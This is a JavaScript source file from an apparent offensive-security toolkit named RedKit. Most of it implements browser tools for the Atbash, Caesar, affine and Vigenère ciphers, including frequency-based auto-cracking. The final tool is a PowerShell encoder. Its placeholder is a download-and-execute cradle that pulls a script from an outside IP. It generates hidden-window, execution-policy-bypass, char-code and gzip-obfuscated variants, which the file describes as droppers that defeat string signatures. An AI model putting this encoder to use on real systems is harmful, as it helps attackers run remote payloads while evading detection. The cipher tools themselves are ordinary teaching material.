// RedKit · crypto/ciphers.js (split from crypto.js)
// ===== shared English-frequency scoring (lower chi-squared = more English-like) =====
const ENG_FREQ = [8.167, 1.492, 2.782, 4.253, 12.702, 2.228, 2.015, 6.094, 6.966, 0.153, 0.772, 4.025, 2.406, 6.749, 7.507, 1.929, 0.095, 5.987, 6.327, 9.056, 2.758, 0.978, 2.360, 0.150, 1.974, 0.074];
const chiSqEng = (text) => {
  const c = new Array(26).fill(0); let n = 0;
  for (const ch of text) { const i = (ch.charCodeAt(0) | 32) - 97; if (i >= 0 && i < 26) { c[i]++; n++; } }
  if (!n) return Infinity;
  let chi = 0; for (let i = 0; i < 26; i++) { const e = ENG_FREQ[i] / 100 * n; chi += (c[i] - e) ** 2 / e; }
  return chi;
};
const caesarShift = (s, n) => s.replace(/[a-z]/gi, c => {
  const base = c <= 'Z' ? 65 : 97;
  return String.fromCharCode((c.charCodeAt(0) - base + (n % 26) + 26) % 26 + base);
});

// ===== CLASSIC CIPHERS (keyless transforms) =====
TOOLS['cipher'] = {
  title: 'Classic Ciphers',
  desc: 'Atbash (reverses the alphabet, A↔Z) and text reverse. Symmetric keyless transforms.',
  render() {
    return `
      <div class="tool">
        <div class="explainer">
          <span class="explainer-q">What do these do?</span>
          <span class="explainer-body">Atbash reverses the alphabet, so A becomes Z, B becomes Y, C becomes X, and so on (it is symmetric, so running it twice returns the original). Reverse just flips the character order, so "hello" becomes "olleh".</span>
          <pre class="atbash-map mono" data-noi18n>A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
Z Y X W V U T S R Q P O N M L K J I H G F E D C B A</pre>
        </div>
        ${card('Input', `
          ${field('', `<textarea id="cip-input" placeholder="enter text..."></textarea>`)}
          <div class="btn-row">
            <button class="btn" data-cmd="atbash">Atbash</button>
            <button class="btn" data-cmd="reverse">Reverse</button>
          </div>
        `)}
        ${card('', resultHead('Output', ghostBtn('cip-copy')) + `<div class="result-box" id="cip-output"></div>`, { id: 'cip-results', hidden: true })}
      </div>
    `;
  },
  init() {
    const atbash = s => s.replace(/[a-z]/gi, c => {
      const base = c <= 'Z' ? 65 : 97;
      return String.fromCharCode(25 - (c.charCodeAt(0) - base) + base);
    });
    $$('[data-cmd]', $('#cip-input').closest('.card')).forEach(b => {
      b.addEventListener('click', () => {
        const txt = $('#cip-input').value;
        $('#cip-output').textContent = b.dataset.cmd === 'atbash' ? atbash(txt) : txt.split('').reverse().join('');
        $('#cip-results').style.display = 'block';
      });
    });
    wireCopy('cip-copy', () => $('#cip-output').textContent);
  }
};

// ===== CAESAR / ROT (live brute-force of all 26 shifts + English auto-detect) =====
TOOLS['caesar'] = {
  title: 'Caesar / ROT',
  desc: 'Caesar shift (ROT-N) with live brute-force of all 26 rotations and English auto-detection. Covers ROT13 and every shift.',
  render() {
    return `
      <div class="tool">
        <div class="explainer">
          <span class="explainer-q">What is the Caesar cipher?</span>
          <span class="explainer-body">It shifts every letter forward by a fixed number of places. ROT13 is a Caesar shift of 13. This tool tries all 26 shifts at once and highlights the one that reads most like English, so you can crack it without knowing the shift.</span>
        </div>
        ${card('Input', `
          ${field('', `<textarea id="cz-input" placeholder="paste ciphertext to auto-crack, or text to encrypt..."></textarea>`)}
          ${field('Encrypt with a specific shift', `<span class="cz-enc"><input type="number" id="cz-shift" value="3" min="0" max="25"><button class="btn" id="cz-enc-btn">Encrypt</button></span>`)}
        `)}
        ${card('', resultHead('Encrypted', ghostBtn('cz-enc-copy')) + `<div class="result-box" id="cz-enc-out"></div>`, { id: 'cz-enc-card', hidden: true })}
        ${card('', resultHead('Brute-force: all 26 rotations (likely plaintext highlighted)') + `<div id="cz-brute"></div>`)}
      </div>
    `;
  },
  init() {
    const brute = () => {
      const inp = $('#cz-input'), box = $('#cz-brute');
      if (!inp || !box) return; // tool was navigated away before the debounced call fired
      const txt = inp.value;
      if (!txt) { box.innerHTML = '<div class="mg-empty">Type or paste text to see all 26 rotations.</div>'; return; }
      let best = 0, bestChi = Infinity; const rows = [];
      for (let n = 0; n < 26; n++) { const dec = caesarShift(txt, -n); const chi = chiSqEng(dec); if (chi < bestChi) { bestChi = chi; best = n; } rows.push([n, dec]); }
      box.innerHTML = rows.map(([n, dec]) =>
        `<div class="cz-row${n === best ? ' cz-best' : ''}"><span class="cz-shift">ROT${n}</span><span class="cz-text mono" data-copy="${escapeHtml(dec)}">${escapeHtml(dec)}</span>${n === best ? '<span class="cz-flag">likely</span>' : ''}</div>`).join('');
      wireCopyAll(box);
    };
    let t; $('#cz-input').addEventListener('input', () => { clearTimeout(t); t = setTimeout(brute, 140); });
    $('#cz-enc-btn').addEventListener('click', () => {
      const n = ((parseInt($('#cz-shift').value) || 0) % 26 + 26) % 26;
      $('#cz-enc-out').textContent = caesarShift($('#cz-input').value, n);
      $('#cz-enc-card').style.display = 'block';
    });
    wireCopy('cz-enc-copy', () => $('#cz-enc-out').textContent);
    brute();
  }
};

// ===== AFFINE CIPHER  E(x) = (a·x + b) mod 26 =====
TOOLS['affine'] = {
  title: 'Affine Cipher',
  desc: 'Encrypt, decrypt, and brute-force the affine cipher E(x) = (a·x + b) mod 26, with English auto-detection.',
  render() {
    const aOpts = [1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25].map(a => `<option>${a}</option>`).join('');
    return `
      <div class="tool">
        <div class="explainer">
          <span class="explainer-q">What is the affine cipher?</span>
          <span class="explainer-body">It maps each letter x (0 to 25) to (a times x plus b) mod 26, using two keys. The key a must be coprime with 26 so the mapping can be reversed. Press Auto-Crack to try every valid key and keep the most English-looking result.</span>
        </div>
        ${card('Input', `
          ${field('', `<textarea id="af-input" placeholder="enter text..."></textarea>`)}
          <div class="af-keys">
            ${field('Key a (coprime with 26)', `<select id="af-a">${aOpts}</select>`)}
            ${field('Key b (0–25)', `<input type="number" id="af-b" value="0" min="0" max="25">`)}
          </div>
          <div class="btn-row">
            <button class="btn" data-cmd="enc">Encrypt</button>
            <button class="btn" data-cmd="dec">Decrypt</button>
            <button class="btn" data-cmd="crack">Auto-Crack</button>
          </div>
        `)}
        ${card('', resultHead('Output', ghostBtn('af-copy')) + `<div class="result-box" id="af-output"></div>`, { id: 'af-results', hidden: true })}
      </div>
    `;
  },
  init() {
    const A_VALS = [1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25];
    const modinv = (a) => { for (let t = 1; t < 26; t++) if ((a * t) % 26 === 1) return t; return 1; };
    const affine = (s, a, b, dec) => {
      const ai = modinv(a);
      return s.replace(/[a-z]/gi, c => {
        const base = c <= 'Z' ? 65 : 97, x = c.charCodeAt(0) - base;
        const y = dec ? (ai * (((x - b) % 26) + 26)) % 26 : (a * x + b) % 26;
        return String.fromCharCode(y + base);
      });
    };
    const crack = (txt) => {
      let best = null, bestChi = Infinity;
      for (const a of A_VALS) for (let b = 0; b < 26; b++) { const dec = affine(txt, a, b, true); const chi = chiSqEng(dec); if (chi < bestChi) { bestChi = chi; best = { a, b, dec }; } }
      return best;
    };
    const out = $('#af-output');
    $$('[data-cmd]', $('#af-input').closest('.card')).forEach(btn => btn.addEventListener('click', () => {
      const cmd = btn.dataset.cmd, txt = $('#af-input').value;
      const a = parseInt($('#af-a').value) || 1, b = ((parseInt($('#af-b').value) || 0) % 26 + 26) % 26;
      let r;
      if (cmd === 'enc') r = affine(txt, a, b, false);
      else if (cmd === 'dec') r = affine(txt, a, b, true);
      else { if (!txt.replace(/[^a-z]/gi, '')) r = '⚠ Enter some ciphertext to brute-force.'; else { const c = crack(txt); $('#af-a').value = c.a; $('#af-b').value = c.b; r = `Key a=${c.a}, b=${c.b}\n\n${c.dec}`; } }
      out.textContent = r;
      $('#af-results').style.display = 'block';
    }));
    wireCopy('af-copy', () => out.textContent);
  }
};

// ===== VIGENÈRE CIPHER (encrypt / decrypt / auto-crack) =====
TOOLS['vigenere'] = {
  title: 'Vigenère Cipher',
  desc: 'Encrypt, decrypt, and auto-crack the Vigenère cipher. Keyless cryptanalysis via Index of Coincidence and chi-squared frequency analysis.',
  render() {
    return `
      <div class="tool">
        <div class="explainer">
          <span class="explainer-q">What is the Vigenère cipher?</span>
          <span class="explainer-body">It shifts each letter by a different amount taken from a repeating keyword, so the same letter can encrypt differently. That makes it much stronger than a Caesar cipher. Leave the key blank and press Auto-Crack to recover it from the ciphertext alone.</span>
        </div>
        ${card('Input', `
          ${field('', `<textarea id="vg-input" placeholder="enter text..."></textarea>`)}
          ${field('Key (leave blank and use Auto-Crack to recover it)', `<input type="text" id="vg-key" placeholder="e.g. SECRET" autocomplete="off" spellcheck="false">`)}
          <div class="btn-row">
            <button class="btn" data-cmd="enc">Encrypt</button>
            <button class="btn" data-cmd="dec">Decrypt</button>
            <button class="btn" data-cmd="crack">Auto-Crack</button>
          </div>
        `)}
        ${card('', resultHead('Output', ghostBtn('vg-copy')) + `<div class="result-box" id="vg-output"></div>`, { id: 'vg-results', hidden: true })}
      </div>
    `;
  },
  init() {
    // key cycles over alphabetic chars only; non-letters pass through and don't advance the key; case preserved
    const vigenere = (s, key, decrypt) => {
      key = (key || '').replace(/[^a-z]/gi, '').toUpperCase();
      if (!key) return s;
      let ki = 0;
      return s.replace(/[a-z]/gi, c => {
        const base = c <= 'Z' ? 65 : 97;
        const k = key.charCodeAt(ki % key.length) - 65;
        ki++;
        const shift = decrypt ? 26 - k : k;
        return String.fromCharCode((c.charCodeAt(0) - base + shift) % 26 + base);
      });
    };
    // --- auto-crack: key length via Index of Coincidence, key letters via chi-squared vs English ---
    const ENG = [8.167, 1.492, 2.782, 4.253, 12.702, 2.228, 2.015, 6.094, 6.966, 0.153, 0.772, 4.025, 2.406, 6.749, 7.507, 1.929, 0.095, 5.987, 6.327, 9.056, 2.758, 0.978, 2.360, 0.150, 1.974, 0.074];
    const indexOfCoincidence = (s) => {
      const c = new Array(26).fill(0);
      for (const ch of s) c[ch.charCodeAt(0) - 65]++;
      const n = s.length;
      if (n < 2) return 0;
      let sum = 0; for (let i = 0; i < 26; i++) sum += c[i] * (c[i] - 1);
      return sum / (n * (n - 1));
    };
    const bestShift = (coset) => {
      let best = 0, bestChi = Infinity;
      for (let s = 0; s < 26; s++) {
        const c = new Array(26).fill(0);
        for (const ch of coset) c[(ch.charCodeAt(0) - 65 - s + 26) % 26]++;
        let chi = 0; for (let i = 0; i < 26; i++) { const e = ENG[i] / 100 * coset.length; if (e > 0) chi += (c[i] - e) ** 2 / e; }
        if (chi < bestChi) { bestChi = chi; best = s; }
      }
      return best;
    };
    const coset = (letters, L, i) => { let cs = ''; for (let j = i; j < letters.length; j += L) cs += letters[j]; return cs; };
    const crackVigenere = (cipher) => {
      const letters = cipher.toUpperCase().replace(/[^A-Z]/g, '');
      if (letters.length < 20) return null;
      const maxLen = Math.min(20, Math.floor(letters.length / 2));
      const scored = [];
      for (let L = 1; L <= maxLen; L++) {
        let total = 0; for (let i = 0; i < L; i++) total += indexOfCoincidence(coset(letters, L, i));
        scored.push([L, total / L]);
      }
      const above = scored.filter(([, v]) => v >= 0.058);            // smallest length that looks English-like (random IC ≈ 0.038)
      const len = above.length ? above[0][0] : scored.reduce((a, b) => b[1] > a[1] ? b : a)[0];
      let key = '';
      for (let i = 0; i < len; i++) key += String.fromCharCode(65 + bestShift(coset(letters, len, i)));
      return { key, len, ic: scored.find(([L]) => L === len)[1] };
    };

    $$('[data-cmd]', $('#vg-input').closest('.card')).forEach(b => {
      b.addEventListener('click', () => {
        const cmd = b.dataset.cmd, txt = $('#vg-input').value;
        let r;
        if (cmd === 'enc') r = vigenere(txt, $('#vg-key').value, false);
        else if (cmd === 'dec') r = vigenere(txt, $('#vg-key').value, true);
        else if (cmd === 'crack') {
          const res = crackVigenere(txt);
          if (!res) r = '⚠ Need at least ~20 letters of ciphertext to auto-crack.';
          else { $('#vg-key').value = res.key; r = `Key: ${res.key}  ·  length ${res.len}  ·  IC ${res.ic.toFixed(4)}\n\n${vigenere(txt, res.key, true)}`; }
        }
        $('#vg-output').textContent = r;
        $('#vg-results').style.display = 'block';
      });
    });
    wireCopy('vg-copy', () => $('#vg-output').textContent);
  }
};


// ===== POWERSHELL ENCODER (-EncodedCommand, Base64 UTF-16LE) =====
TOOLS['ps-encode'] = {
  title: 'PowerShell Encoder',
  desc: 'Encode a PowerShell command into multiple execution and obfuscation variants.',
  render() {
    return `
      <div class="tool">
        ${card('PowerShell Command', `
          ${field('Command to encode', `<textarea id="pe-in" placeholder="IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1/s.ps1')"></textarea>`)}
          ${field('Flags', `<div class="pe-flags">
            <label class="pe-chk"><input type="checkbox" id="pe-nop" checked> -NoProfile</label>
            <label class="pe-chk"><input type="checkbox" id="pe-win" checked> -WindowStyle Hidden</label>
            <label class="pe-chk"><input type="checkbox" id="pe-ep" checked> -ExecutionPolicy Bypass</label>
            <label class="pe-chk"><input type="checkbox" id="pe-noni"> -NonInteractive</label>
          </div>`)}
        `)}
        <div id="pe-out"></div>
      </div>`;
  },
  init() {
    const out = $('#pe-out');
    const u16 = (s) => { let b = ''; for (let i = 0; i < s.length; i++) { const c = s.charCodeAt(i); b += String.fromCharCode(c & 0xff) + String.fromCharCode((c >> 8) & 0xff); } return btoa(b); };
    const u8 = (s) => { try { return btoa(unescape(encodeURIComponent(s))); } catch (e) { return btoa(s); } };
    const flags = () => {
      const f = [];
      if ($('#pe-nop').checked) f.push('-nop');
      if ($('#pe-win').checked) f.push('-w hidden');
      if ($('#pe-ep').checked) f.push('-ep bypass');
      if ($('#pe-noni').checked) f.push('-noni');
      return f.length ? f.join(' ') + ' ' : '';
    };

    // gzip+base64 of the current command (async; populated by refresh())
    let gz = '';
    const computeGz = async (cmd) => {
      gz = '';
      if (!cmd || !window.CompressionStream) return;
      try {
        const data = new TextEncoder().encode(cmd);
        const stream = new Blob([data]).stream().pipeThrough(new CompressionStream('gzip'));
        const buf = new Uint8Array(await new Response(stream).arrayBuffer());
        let bin = ''; for (let i = 0; i < buf.length; i++) bin += String.fromCharCode(buf[i]);
        gz = btoa(bin);
      } catch (e) { gz = ''; }
    };

    const variants = (cmd) => {
      const fp = flags();
      const list = [
        ['EncodedCommand (Base64, UTF-16LE)', 'Raw Base64 for the -EncodedCommand / -e flag. The canonical PowerShell encoding.', u16(cmd)],
        ['Full -EncodedCommand', 'Ready-to-run command line using the flags selected above.', `powershell.exe ${fp}-enc ${u16(cmd)}`],
        ['IEX FromBase64 (UTF-16LE)', 'Decodes the Base64 at runtime and runs it with IEX (Unicode).', `powershell ${fp}-c "IEX([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('${u16(cmd)}')))"`],
        ['IEX FromBase64 (UTF-8)', 'Same idea using UTF-8, which gives shorter Base64 for ASCII commands.', `powershell ${fp}-c "IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${u8(cmd)}')))"`],
        ['Char-code array (IEX)', 'Rebuilds the command from character codes (no Base64 string present).', `powershell ${fp}-c "IEX(([char[]](${[...cmd].map(c => c.charCodeAt(0)).join(',')}) -join ''))"`],
        ['Base64 (UTF-8, raw)', 'Plain UTF-8 Base64 of the command, with no wrapper.', u8(cmd)],
        ['cmd.exe wrapper', 'Launches via cmd.exe, handy inside .bat files or one-line droppers.', `cmd.exe /c powershell.exe ${fp}-enc ${u16(cmd)}`],
      ];
      if (gz) list.splice(2, 0, ['Gzip + Base64 cradle', 'Compresses the payload, then decompresses and runs it at runtime. Smaller, and defeats naive string signatures.', `powershell ${fp}-c "IEX(New-Object IO.StreamReader(New-Object IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('${gz}'),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"`]);
      return list;
    };

    let cur = 0;
    const render = () => {
      const cmd = $('#pe-in').value;
      if (!cmd) { out.innerHTML = ''; return; }
      const V = variants(cmd);
      cur = Math.min(cur, V.length - 1);
      out.innerHTML = card('', `
        <div class="not-formats">${V.map(([n], i) => `<button class="not-fmt" data-i="${i}">${escapeHtml(n)}</button>`).join('')}</div>
        <div class="result-header"><h4 class="not-fmt-title"></h4><button class="btn btn-ghost" id="pe-copy">Copy</button></div>
        <p class="pe-desc" id="pe-desc"></p>
        <pre class="not-pre mono" id="pe-result"></pre>
        <div class="pe-info" id="pe-info"></div>
      `);
      const show = (i) => {
        cur = i;
        const [name, desc, val] = V[i];
        $('#pe-result', out).textContent = val;
        $('.not-fmt-title', out).textContent = name;
        $('#pe-desc', out).textContent = desc;
        const n = val.length, over = n > 8191;
        $('#pe-info', out).textContent = over ? `${n} characters. Exceeds the cmd.exe 8191-character command-line limit.` : `${n} characters`;
        $('#pe-info', out).classList.toggle('pe-warn', over);
        $$('.not-fmt', out).forEach((b, j) => b.classList.toggle('active', j === i));
      };
      $$('.not-fmt', out).forEach(b => b.addEventListener('click', () => show(+b.dataset.i)));
      wireCopy('pe-copy', () => $('#pe-result', out).textContent);
      show(cur);
    };

    const refresh = async () => { await computeGz($('#pe-in').value); render(); };
    $('#pe-in').addEventListener('input', refresh);
    $$('.pe-flags input').forEach(c => c.addEventListener('change', render));
    refresh();
  }
};

